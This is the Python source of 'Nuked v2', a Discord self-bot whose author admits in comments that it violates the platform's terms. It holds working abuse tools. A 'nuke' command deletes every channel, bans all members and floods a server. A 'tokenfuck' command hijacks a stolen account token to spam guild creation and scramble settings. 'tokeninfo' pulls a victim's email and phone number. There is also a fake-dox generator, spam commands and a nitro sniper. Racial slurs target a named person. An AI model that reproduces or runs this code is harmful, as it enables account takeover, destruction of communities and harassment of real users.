import discord
from discord.ext import commands, tasks
import time
import requests
import asyncio
import json
import random
import datetime
import colorama
import re
import os
from os import system, name
from pypresence import Presence
from time import sleep
import ctypes
import colorama
from colorama import init, Fore, Style, Back
import numpy
from itertools import cycle
import datetime
import base64
from bs4 import BeautifulSoup as bs4
import proxyscrape


# strap is a fag
# i do not condone usage of this, just made it cuz i was bored.
# if you get banned it isn't my fault lol
# this is violating tos but idc, i dont condone usage of it so im ok right?
# hopefully
# ily ;)

with open('config.json') as f:
    config = json.load(f)


def pscrape():
    collector = proxyscrape.create_collector('default', 'http')
    proxy = collector.get_proxies({'country': 'united states'})
    return str(proxy)



def clear():
    if name == 'nt':
        system('cls')
    else:
        rich_presence = False
        system('clear')



pn = '0123456789'
colorama.init()

def Init():
    if config.get('token') == "token here":
        clear()
        print(Fore.RED + "ERROR: " + Fore.RESET + "In the config.json file, did you enter your token?")
        input("Press any key to exit, and go to the config.json file and put your token there.")
    elif config.get('password') == "":
        clear()
        print(Fore.RED + "ERROR: " + Fore.RESET + "In the config.json file, password must have a value. If you do not what to enter your password, simply put 'none' within the quotes.")
        input("Press any key to exit and fix the error above.")
    else:
        try:
            client.run(token, bot=False, reconnect=True)
        except Exception as error:
            print(f"Error logging into token: {error}")
            input()


languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}
locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

# wouldn't recommend editing any of this unless you know what you're doing.


def searchq(link):
    return f"https://google.com/search?q={link}".replace(" ", "+")

ignore_prefix = config.get('ignore_prefix')



token = config.get('token')
password = config.get('password')
rich_presence = config.get('richpresence')
randomness = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijlkmnopqrstuvwxyz'

randomnum = '123456789'

example_token = 'NjIyODYwMDg3MTQwMjg2NDc0.X2LFQQ.z4RlKmLUaMaouzJg5cs6Ydg9xrc'

if not ignore_prefix:
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Nuked v2 | Enter desired prefix.")
    except:
        pass
    prefix = input("Enter desired prefix, press enter for default (.): ")
    if prefix == "":
        prefix = "."
else:
    prefix = '.'
    pass

client = commands.Bot(description="irdk anymore mane :(", command_prefix=prefix, self_bot=True)

client.remove_command('help')

clear()
for letter in "Logging into Nuked":
    print(Fore.LIGHTRED_EX + "                                                      " + letter)
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(letter)
    except:
        pass
    time.sleep(0.1)

clear()
print(Fore.GREEN + "                              Login Success " + Fore.CYAN + "|" + Fore.CYAN + " Welcome to " + Fore.RED + "Nuked v2" + Fore.LIGHTWHITE_EX + " | Loading Splash.")

def owner():
    answer = "kylie#1337, add me :)"
    return answer


addresses = [
    '433 Admiral Callaghan Ln, Vallejo, CA, 94591',
    '5029 County Rd #153, Zanesfield, OH, 43360',
    '10001 Nathan Ln N, Osseo, MN, 55369',
    '495 Park Hill Rd, Collierville, TN, 38017',
    '1 Appian Way #703-5, South San Francisco, CA, 94080',
    '547 Kemper St, Shreveport, LA, 71106',
    '835 Buffalo Br, Morehead, KY, 40351',
    '249 Hardin Rd, Delanson, NY, 12053',
    '2647 Albany St, Broken Arrow, OK, 74014',
    '6836 Piershill Ln, Cary, NC, 27519'
]


@client.event
async def on_connect():
    system('cls')
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'Welcome to Nuked v2, {client.user.name}#{client.user.discriminator}. Command prefix is \"{prefix}\" | Login Successful.')
    except:
        pass
    splash()

def splash():
    print(f'''{Fore.RED}
    			   ███╗  ██╗    ██╗   ██╗    ██╗  ██╗    ███████╗    ██████╗
    			   ████╗ ██║    ██║   ██║    ██║ ██╔╝    ██╔════╝    ██╔══██╗
    			   ██╔██╗██║    ██║   ██║    █████═╝     █████╗      ██║  ██║
    			   ██║╚████║    ██║   ██║    ██╔═██╗     ██╔══╝      ██║  ██║
    			   ██║ ╚███║    ╚██████╔╝    ██║ ╚██╗    ███████╗    ██████╔╝
    			   ╚═╝  ╚══╝     ╚═════╝     ╚═╝  ╚═╝    ╚══════╝    ╚═════╝

                                            {Fore.RESET}{Fore.LIGHTGREEN_EX}Welcome to {Fore.RED}Nuked v2 {Fore.RESET}

                                                {Fore.CYAN}Selfbot Info{Fore.RESET}

                                            {Fore.LIGHTGREEN_EX}Prefix: {Fore.WHITE}{prefix}{Fore.RESET}
                                            {Fore.LIGHTBLUE_EX}Creator: {Fore.LIGHTCYAN_EX}kylie#1337{Fore.RESET}
                                            {Fore.LIGHTMAGENTA_EX}Help Command: {Fore.LIGHTRED_EX}{prefix}help{Fore.RESET}
                                            {Fore.LIGHTYELLOW_EX}Nitro Sniper: Active{Fore.RESET}
                                            {Fore.LIGHTCYAN_EX}Mention Logger: Active{Fore.RESET}

                                                {Fore.CYAN}User Info{Fore.RESET}

                                            {Fore.YELLOW}ID: {client.user.id}{Fore.RESET}
                                            {Fore.LIGHTBLUE_EX}Display Name: {client.user.name}#{client.user.discriminator}{Fore.RESET}
                                            {Fore.LIGHTWHITE_EX}MFA Enabled?: {client.user.mfa_enabled}{Fore.RESET}
                                            {Fore.GREEN}Email Verified?: {client.user.verified}
                                            {Fore.LIGHTGREEN_EX}Server Count: {len(client.guilds)}{Fore.RESET}
                                            {Fore.LIGHTMAGENTA_EX}Rich Presence: {rich_presence}{Fore.RESET}


        ''' + Fore.RESET)


def Nitro():
    code = ''.join(random.choices(randomness + randomnum, k=16))
    return f'https://discord.gift/{code}'


def tokengener():
    token = ''.join(random.choices(example_token, k=random.randrange(50, 60)))
    return token

def masstokengen():
    tokenfile = open("tokens.txt", "a")
    for i in range(300):
        tokens = ''.join(random.choices(example_token, k=random.randrange(50, 60)))
        tokenfile.write(tokens + "\n")


if rich_presence:
    x = True
    rpcc = Presence(client_id="768384936138244107")
    rpcc.connect()
    rpcc.update(details='Online', large_image="nuked")
    while not x: time.sleep(0.1)
else:
    pass

@client.command()
async def bump(ctx):
    await ctx.message.delete()
    await ctx.send("Starting..", delete_after=4)
    while True:
        bumped = 0
        var = bumped + bumped + 1
        try:
            await ctx.send('!d bump')
            print("Bumped.")
            await asyncio.sleep(7200)
        except Exception as e:
            print(f"Couldn't bump. Did the channel get nuked or deleted? Error: {e}")


@client.command()
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())


@client.command(aliases=['whois'])
async def userinfo(ctx, member: discord.Member = None):
    await ctx.message.delete()
    if not member:  # if member is no mentioned
        member = ctx.message.author  # set member as the author
    roles = [role for role in member.roles]
    embed = discord.Embed(color=0xfd53d0, timestamp=ctx.message.created_at,
                          title=f"User Info - {member}")
    embed.set_thumbnail(url=member.avatar_url)

    embed.add_field(name="ID", value=member.id)
    embed.add_field(name="Display Name", value=member.display_name)
    embed.add_field(name="Animated Avatar? ", value=member.is_avatar_animated())
    try:
        embed.add_field(name="Mutual Friends", value=len(await member.mutual_friends()))
    except:
        pass

    embed.add_field(name="Created Account On", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="Joined Server On", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))

    embed.add_field(name="Roles", value="".join([role.mention for role in roles]))
    embed.add_field(name="Highest Role", value=member.top_role.mention)
    await ctx.send(embed=embed, delete_after=20)


@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Help", color=0xfd53d0)
    embed.add_field(name="**bump**", value="bumps server that it is ran in automatically every 7200 seconds.", inline=False)
    embed.add_field(name="**purge**", value="purges specified messages sent by you.", inline=False)
    embed.add_field(name="**webping**", value="pings a **website.**", inline=False)
    embed.add_field(name='**userinfo**', value='shows user info on a mentioned person.', inline=False)
    embed.add_field(name="**nitro**", value="sends a random nitro code.", inline=False)
    embed.add_field(name="**info**", value="shows selfbot info.", inline=False)
    embed.add_field(name="**nuke**", value="nukes a server.", inline=False)
    embed.add_field(name="**clown**", value="clowns someone.", inline=False)
    embed.add_field(name="**free**", value="shows a good free accounts website.", inline=False)
    embed.add_field(name="**spam**", value='spams a message for x amount of times.', inline=False)
    embed.add_field(name="**tokengen**", value="generates a token.", inline=False)
    embed.add_field(name="**kiss**", value="kisses someone.", inline=False)
    embed.add_field(name="**pussy**", value="shows a pussy pic.", inline=False)
    embed.add_field(name="**hug**", value="hugs someone.", inline=False)
    embed.add_field(name="**spank**", value='spanks mentioned user.', inline=False)
    embed.add_field(name="**setnicks**", value="sets everyones nickname to user specified name.", inline=False)
    embed.add_field(name="**revertnicks**", value="reverts everyones nickname back to their name.", inline=False)
    embed.add_field(name="**guildname**", value="sets the servers name.", inline=False)
    embed.add_field(name="**cat**", value="shows a cat.", inline=False)
    embed.add_field(name="**channel**", value="creates a channel with user specified name.", inline=False)
    embed.add_field(name="**boobs**", value="shows boobs.", inline=False)
    embed.add_field(name="**query**", value="queries your message into google.", inline=False)
    embed.add_field(name='**joke**', value='random joke from an API.', inline=False)
    embed.add_field(name='**tickle**', value='tickles mentioned user.', inline=False)
    embed.add_field(name='**scrape**', value='proxy scraper.', inline=False)
    embed.add_field(name='**dox**', value='fake doxes a user.', inline=False)
    embed.add_field(name='**setname**', value='sets your username to whatever is specified.', inline=False)
    embed.add_field(name='**allservers**', value='displays every server you\'re in inside of the console.', inline=False)
    embed.add_field(name='**embed**', value='sends a user specified embed.', inline=False)
    embed.add_field(name='**id**', value='shows a user\'s id.', inline=False)
    embed.add_field(name='**bold**', value='sends your message, but bold.', inline=False)
    embed.add_field(name='**italics**', value='sends your message, but italicized.', inline=False)
    embed.add_field(name='**hidden**', value='sends your message, but hidden.', inline=False)
    embed.add_field(name='**strike**', value='sends your message, but striked through.', inline=False)
    embed.add_field(name='**hspam**', value='spams the chat with a huge blank message.', inline=False)
    embed.add_field(name='**underline**', value='sends your message, but underlined.', inline=False)
    embed.add_field(name="**wyr**", value='sends a would you rather question.', inline=False)
    embed.add_field(name="**id**", value='sends the ID of the mentioned user.', inline=False)
    embed.add_field(name="**logout**", value='logs out of selfbot and closes window.', inline=False)
    embed.set_footer(text=f"Prefix is \"{prefix}\"")
    await ctx.send(embed=embed, delete_after=25)


@client.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass


@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)
        await asyncio.sleep(0.1)


@client.command(aliases=['webping'])
async def pingsite(ctx, *, website):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            embed = discord.Embed(title="**Website is down.**", description=f"responded with a status code of {r}",
                                  color=0xfd53d0)
            await ctx.send(embed=embed, delete_after=3)
        else:
            embed = discord.Embed(title="**Website is online.**", description=f"responded with a status code of {r}",
                                  color=0xfd53d0)
            await ctx.send(embed=embed, delete_after=3)


@client.command(aliases=['exit'])
async def logout(ctx):
    await ctx.message.delete()
    await ctx.send("logging out..", delete_after=1)
    await asyncio.sleep(2)
    exit(0)


@client.command(aliases=['strap'])
async def nigger(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Strap**", color=0xfd53d0, description="**is** \n **a** \n **nigger**")
    await ctx.send(embed=embed, delete_after=10)


@client.command(aliases=['tard'])
async def clown(ctx, arg):
    await ctx.message.delete()
    if arg == "":
        await ctx.send("specify someone to clown tard", delete_after=5)
    try:
        embed = discord.Embed(title="**you're a clown**", color=0xfd53d0,
                              description=f"{arg} is a fucking clown \n lol \n ur so unfunny")
        await ctx.send(embed=embed, delete_after=10)
    except Exception as err:
        await ctx.send(f"Error: {err}", delete_after=3)


@client.command(aliases=['free'])
async def freeaccounts(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Free Accounts**", color=0xfd53d0,
                          description="use this link for free accounts and shit \n \nhttps://leak.sx/")
    await ctx.send(embed=embed)


@client.command(aliases=['token'])
async def tokengen(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Token Generator**", color=0xfd53d0,
                          description=f"Generated Token below, **THESE WILL NOT ALWAYS WORK** \n \n {tokengener()}")
    await ctx.send(embed=embed, delete_after=15)


@client.command(aliases=['discfuck'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': "https://i.imgur.com/QHq1tiY.png",
        'name': "KYLIE RUNS ME",
        'region': "europe"
    }
    for _i in range(100):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@client.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token" + Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})",
        color=0xfd53d0)
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em, delete_after=10)


@client.command(aliases=['porn'])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekobot.xyz/api/image?type=pussy").json()
    embed = discord.Embed(name="**NSFW**", color=0xfd53d0)
    embed.set_image(url=str(r["message"]))
    await ctx.send(embed=embed, delete_after=10)


@client.event
async def on_message_edit(before, after):
    await client.process_commands(after)


@client.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}It seems you cannot run this command due to missing permissions." + Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Missing arguments: {error}" + Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Not a valid image" + Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Discord error: {error}" + Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Couldn't send a empty message" + Fore.RESET)
    else:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{error_str}" + Fore.RESET)




@client.command(aliases=['av'])
async def avatar(ctx, *, member: discord.Member = None):
    await ctx.message.delete()
    embed = discord.Embed(title=f"{member}'s avatar", color=0xfd53d0)
    avatarurl = member.avatar_url
    embed.set_image(url=avatarurl)
    await ctx.send(embed=embed, delete_after=25)


@client.command()
async def info(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Selfbot Information**", color=0xfd53d0)
    embed.add_field(name="**made in**", value="discord.py")
    embed.add_field(name="**made by**", value="kylie#1337")
    embed.add_field(name="**running under the user**", value=f"{client.user.name}#{client.user.discriminator}")
    embed.set_footer(text="kylie#1337 <3")
    await ctx.send(embed=embed, delete_after=4)


@client.command(aliases=['rep'])
async def spamreport(ctx, member: discord.Member = None):
    await ctx.message.delete()
    for i in range(15):
        await ctx.send(f"Report sent to Discord for <@{member.id}>", delete_after=1)


@client.command()
async def cls(ctx):
    await ctx.message.delete()
    await ctx.send("Clearing Console..", delete_after=1)
    clear()


@client.command()
async def game(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await client.change_presence(activity=game)


@client.command()
async def listening(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))


@client.command(aliases=['serverfuck'])
async def nuke(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="kylie runs me",
            description="Nuked ON TOP",
            reason="idk",
            icon=None,
            banner=gayass
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="kylie runs me")
    for _i in range(250):
        await ctx.guild.create_role(name="kylie runs me")

@client.command(aliases=['mtg'])
async def masstokens(ctx):
    await ctx.message.delete()
    masstokengen()
    embed = discord.Embed(title="**Generated 300 tokens.**", color=0xfd53d0, description="generated 300 tokens in tokens.txt. these might not work.")
    await ctx.send(embed=embed)

@client.command(aliases=['extensiveinfo', 'showtoken'])
async def clientinfo(ctx):
    await ctx.message.delete()
    await ctx.send("Extensive client info now in console. Warning: It contains user token!", delete_after=4)
    print("Token: " + token)
    print(f"Email: {client.user.email}")
    print(f"Nitro?: {format(client.user.premium)}")
    print(f"Verified?: {format(client.user.verified)}")
    print("Name: " + client.user.name)
    await asyncio.sleep(15)
    clear()
    splash()

@client.command(aliases=['bit'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    embed = discord.Embed(title='**BTC**', color=0xfd53d0)
    embed.add_field(name="**USD**", value=usd)
    embed.add_field(name="**EUR**", value=eur)
    embed.add_field(name="**GBP**", value=gbp)
    await ctx.send(embed=embed, delete_after=10)

@client.command(aliases=['geoip', 'iplookup'])
async def geo(ctx, arg):
    await ctx.message.delete()
    try:
        r = requests.get(f'http://ip-api.com/json/{arg}')
        embed = discord.Embed(title='**IP Lookup**', color=0xfd53d0)
        embed.add_field(name="**ISP**", value=r.json()['isp'], inline=False)
        embed.add_field(name="**ASN**", value=r.json()['as'], inline=False)
        embed.add_field(name="**City**", value=r.json()['city'], inline=False)
        embed.add_field(name="**Country**", value=r.json()['country'], inline=False)
        embed.add_field(name="**Region**", value=r.json()['regionName'], inline=False)
        embed.add_field(name="**Longitude**", value=r.json()['lon'], inline=False)
        embed.add_field(name="**Latitude**", value=r.json()['lat'], inline=False)
        embed.add_field(name="**Status**", value=r.json()['status'], inline=False)

        await ctx.send(embed=embed, delete_after=10)
    except Exception as e:
        print(Fore.RED + "[ERROR] " + Fore.RESET + Fore.YELLOW + str(e))

@client.listen('on_message')
async def ifmentioned(message):
    if message.author == client.user:
        return
    if str(client.user.id) in message.content:
        print("══════════════════════════════════════════════════")
        print(Fore.LIGHTYELLOW_EX + "[Mentioned] " + Fore.RESET + Fore.LIGHTCYAN_EX + f"You were mentioned by {message.author}." + Fore.RESET)
        print(Fore.LIGHTYELLOW_EX + "[Mentioned] " + Fore.RESET + Fore.LIGHTMAGENTA_EX + f"Server: {message.guild}" + Fore.RESET)
        print(Fore.LIGHTYELLOW_EX + "[Mentioned] " + Fore.RESET + Fore.LIGHTBLUE_EX + f"Channel: {message.channel}")
        print(Fore.LIGHTYELLOW_EX + "[Mentioned] " + Fore.RESET + Fore.WHITE + f"Message Content: {message.content}".replace(f"<@{client.user.id}>" or f"<@!{client.user.id}>", "") + Fore.RESET)
        print("══════════════════════════════════════════════════")


@client.listen('on_message')
async def nitrosnipe(message):
    if 'discord.gift/' in message.content:
        start = datetime.datetime.now()
        code = re.search("discord.gift/(.*)", message.content).group(1)
        token = config.get('token')

        headers = {'Authorization': token}
        r = requests.post(
            f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
            headers=headers,
        ).text


        if 'This gift has been redeemed already.' in r:
            print("══════════════════════════════════════════════════")
            print(Fore.RED + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTCYAN_EX + f"Nitro Code sent by {message.author}." + Fore.RESET)
            print(Fore.RED + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTMAGENTA_EX + f"Server: {message.guild}" + Fore.RESET)
            print(Fore.RED + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTBLUE_EX + f"Channel: {message.channel}" + Fore.RESET)
            print(Fore.RED + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTBLUE_EX + f"Status: Already Redeemed" + Fore.RESET)
            print("══════════════════════════════════════════════════")

        elif 'subscription_plan' in r:
            print("══════════════════════════════════════════════════")
            print(Fore.LIGHTGREEN_EX + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTCYAN_EX + f"Nitro Code sent by {message.author}." + Fore.RESET)
            print(Fore.LIGHTGREEN_EX + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTMAGENTA_EX + f"Server: {message.guild}" + Fore.RESET)
            print(Fore.LIGHTGREEN_EX + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTBLUE_EX + f"Channel: {message.channel}" + Fore.RESET)
            print(Fore.LIGHTGREEN_EX + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTBLUE_EX + f"Status: Nitro Success" + Fore.RESET)
            print("══════════════════════════════════════════════════")


        elif 'Unknown Gift Code' in r:
            print("══════════════════════════════════════════════════")
            print(Fore.LIGHTRED_EX + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTCYAN_EX + f"Nitro Code sent by {message.author}." + Fore.RESET)
            print(Fore.LIGHTRED_EX + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTMAGENTA_EX + f"Server: {message.guild}" + Fore.RESET)
            print(Fore.LIGHTRED_EX + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTBLUE_EX + f"Channel: {message.channel}" + Fore.RESET)
            print(Fore.LIGHTRED_EX + "[Nitro Sniper] " + Fore.RESET + Fore.LIGHTBLUE_EX + f"Status: Unknown Code" + Fore.RESET)
            print("══════════════════════════════════════════════════")

        else:
            return

@client.command()
async def kiss(ctx, member : discord.Member=None):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/kiss")
    embed = discord.Embed(description=f"<@{client.user.id}> kisses <@{member.id}>", color=0xfd53d0)
    embed.set_image(url=r.json()['url'])
    await ctx.send(embed=embed, delete_after=20)

@client.command()
async def hug(ctx, member : discord.Member=None):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/hug")
    embed = discord.Embed(description=f"<@{client.user.id}> hugs <@{member.mention}>", color=0xfd53d0)
    embed.set_image(url=r.json()['url'])
    await ctx.send(embed=embed, delete_after=20)

@client.command()
async def boobs(ctx, member : discord.Member=None):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    embed = discord.Embed(color=0xfd53d0)
    embed.set_image(url=r.json()['url'])
    await ctx.send(embed=embed, delete_after=20)

@client.command()
async def cat(ctx, member : discord.Member=None):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/meow")
    embed = discord.Embed(color=0xfd53d0)
    embed.set_image(url=r.json()['url'])
    await ctx.send(embed=embed, delete_after=20)


@client.command(aliases=['fakedox', 'dox'])
async def userdox(ctx, member : discord.Member=None):
    await ctx.message.delete()
    embed = discord.Embed(title=f"{member}", color=0xfd53d0)
    embed.add_field(name='**Token**', value=f"{base64.b64encode(bytes(str(member.id), 'utf-8')).decode() + '...'}", inline=False)
    embed.add_field(name='**Address**', value=f"{random.choice(addresses)}", inline=False)
    embed.add_field(name='**Phone Number**', value=f"+1 {''.join(random.choices(pn, k=10))}")
    await ctx.send(embed=embed, delete_after=20)

@client.command()
async def query(ctx, *, message):
    await ctx.message.delete()
    embed = discord.Embed(title="**Search Query**", color=0xfd53d0, description=searchq(link=message))
    await ctx.send(embed=embed, delete_after=20)

@client.command()
async def joke(ctx):
    await ctx.message.delete()
    r = requests.get("https://sv443.net/jokeapi/v2/joke/Any?type=single")
    embed = discord.Embed(title="**Joke**", color=0xfd53d0, description=f"{r.json()['joke']}")
    await ctx.send(embed=embed, delete_after=25)


@client.command()
async def setname(ctx, *, message):
    await ctx.message.delete()
    await client.user.edit(username=message, password=password)

@client.command(aliases=['allguilds'])
async def allservers(ctx):
    await ctx.message.delete()
    async for guild in client.fetch_guilds():
        print(guild)
    time.sleep(25)
    splash()


@client.command(aliases=['scrape'])
async def proxscrape(ctx):
    await ctx.message.delete()
    proxfile = open('proxies.txt', 'a')
    proxfile.write(pscrape() + '\n')
    embed = discord.Embed(title="**Proxy Scraper**", color=0xfd53d0, description='proxies in proxies.txt')
    await ctx.send(embed=embed, delete_after=10)

@client.command()
async def embed(ctx, *, message):
    await ctx.message.delete()
    embed = discord.Embed(color=0xfd53d0, description=message)
    embed.set_author(name=str(client.user.display_name + "#" + client.user.discriminator), icon_url=client.user.avatar_url)
    await ctx.send(embed=embed, delete_after=10)

@client.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')

@client.command()
async def italics(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('*' + message + '*')

@client.command(aliases=['st'])
async def strike(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('~~' + message + '~~')

@client.command(aliases=['uline'])
async def underline(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('__' + message + '__')

@client.command(aliases=['hide'])
async def hidden(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')

@client.command(aliases=['hspam'])
async def hiddenspam(ctx):
    await ctx.message.delete()
    await ctx.send("||" + '\n'*400 + '||')

@client.command()
async def wyr(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qor = soup.find(id='qor').text
    qb = soup.find(id='qb').text
    embed = discord.Embed(color=0xfd53d0, description=f'{qa}\n{qor}\n{qb}')
    await ctx.send(embed=embed, delete_after=25)

@client.command()
async def id(ctx, member: discord.Member=None):
    await ctx.message.delete()
    if not member:
        pass
    try:
        embed = discord.Embed(description=f"**{member.mention}'s ID**\n\n{member.id}",color=0xfd53d0)
        await ctx.send(embed=embed, delete_after=15)
    except:
        await ctx.send(f"{member}'s ID" + '\n' + str(member.id), delete_after=20)


@client.command()
async def slap(ctx, user: discord.Member=None):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    embed = discord.Embed(description=f"{client.user.mention} slaps {user.mention}", color=0xfd53d0)
    embed.set_image(url=res['url'])
    await ctx.send(embed=embed, delete_after=20)

@client.command()
async def tickle(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/tickle').json()
    embed = discord.Embed(description=f"{client.user.mention} tickles {member.mention}", color=0xfd53d0)
    embed.set_image(url=r['url'])
    await ctx.send(embed=embed, delete_after=20)

@client.command()
async def spank(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/spank').json()
